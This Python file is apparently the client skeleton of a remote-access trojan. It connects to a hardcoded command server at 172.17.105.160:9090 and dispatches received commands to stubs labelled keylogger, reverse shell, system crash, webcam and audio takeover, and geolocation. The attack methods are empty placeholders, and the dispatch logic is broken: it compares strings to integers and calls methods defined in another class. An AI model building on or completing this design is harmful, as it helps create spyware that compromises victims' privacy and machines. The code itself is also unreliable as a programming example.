from keyboard import *
import socket
from time import sleep
import pyautogui

class Father:
#client server starts here:
    def __init__(self):
        self.host = "172.17.105.160"
        self.port = 9090
        self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def loopback(self):
        try:
            self.route.connect((self.host, self.port))
            print("connection established: ")
        except socket.error as err:
            print("connection error occured")
            self.loopback()
            self.messaging()
    
    def messaging(self):
        while True:
            self.data = self.route.recv(1024).decode("utf-8")
            if not self.data or self.data == "END":
                #incase there is no data from blacksheep {self destruct}
                break
            if self.data == 1:
                #screen recording goes here
                self.screen_record()
                pass
            if self.data == 2:
                #keylogger codes goes here
                self.keylogger()
                pass
            if self.data == 3:
                #screen reverse shell goes here
                self.reverse_shell()
                pass
            if self.data == 4:
                #crashing the entire system
                self.crash_sys()
                pass
            if self.data == 5:
                #take over cameras and audio
                self.webcam()
                pass
            if self.data == 6:
                #get the exact locations
                self.geolocate()
                pass
            else:
                pass
#client server ends here:

class AttackModes:
    def __init__(self):
        pass
    
    #screen recording goes here
    def screen_record():
        pass

    #keylogger codes goes here 
    def keylogger():
        pass

    #screen reverse shell goes here
    def reverse_shell():
        pass

    #crashing the entire system
    def crash_sys():
        pass

    #take over cameras and audio
    def webcam():
        pass

    #get the exact locations
    def geolocate():
        pass
